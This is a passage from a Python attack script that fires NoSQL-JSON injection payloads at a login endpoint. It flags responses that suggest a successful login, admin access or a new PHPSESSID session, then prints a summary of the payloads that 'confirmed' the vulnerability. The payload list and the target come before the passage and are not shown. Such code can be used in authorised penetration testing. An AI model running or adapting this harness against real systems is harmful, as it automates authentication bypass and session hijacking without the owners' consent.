            "has_success": "connected" in response.text.lower() or "success" in response.text.lower() or "welcome" in response.text.lower(),
            "has_error": "error" in response.text.lower() or "invalid" in response.text.lower() or "failed" in response.text.lower(),
            "has_admin": "admin" in response.text.lower(),
            "new_session": response.cookies.get("PHPSESSID", "")
        }
        
        results.append({
            "test_id": f"NoSQL-JSON-{i+1}",
            "type": "NoSQL-JSON",
            "payload": payload,
            "response": indicators,
            "full_response": response.text[:500] if len(response.text) > 500 else response.text
        })
        
        print(f"\n[NoSQL-JSON-{i+1}] Payload: {payload}")
        print(f"Status: {indicators['status_code']} | Length: {indicators['content_length']}B")
        print(f"Success Indicator: {indicators['has_success']}")
        print(f"Session Changed: {indicators['has_session_change']}")
        
        if indicators['has_success']:
            print(f"[!] SUCCESS DETECTED!")
            print(f"Response: {indicators['full_response']}")
        
        if indicators['has_session_change']:
            print(f"[!] NEW SESSION: {indicators['new_session']}")
            
    except Exception as e:
        print(f"[NoSQL-JSON-{i+1}] Error: {str(e)}")

print("\n" + "="*60)
print("SUMMARY ANALYSIS")
print("="*60)

# Analyze results for patterns
successful_payloads = [r for r in results if r["response"]["has_success"]]
session_changed = [r for r in results if r["response"]["has_session_change"]]
suspicious_status = [r for r in results if r["response"]["status_code"] != 200]

print(f"\nTotal payloads tested: {len(results)}")
print(f"Successful authentications: {len(successful_payloads)}")
print(f"Session changes detected: {len(session_changed)}")
print(f"Non-200 status codes: {len(suspicious_status)}")

if successful_payloads:
    print(f"\n[!] VULNERABILITY CONFIRMED - Payloads that succeeded:")
    for sp in successful_payloads:
        print(f"\n  Test ID: {sp['test_id']}")
        print(f"  Type: {sp['type']}")
        print(f"  Payload: {sp['payload']}")
        print(f"  Response snippet: {sp['full_response'][:200]}")

if session_changed:
    print(f"\n[!] SESSION MANIPULATION DETECTED:")
    for sc in session_changed:
        print(f"\n  Test ID: {sc['test_id']}")
        print(f"  Payload: {sc['payload']}")
        print(f"  New Session: {sc['response']['new_session']}")

print("\n" + "="*60)

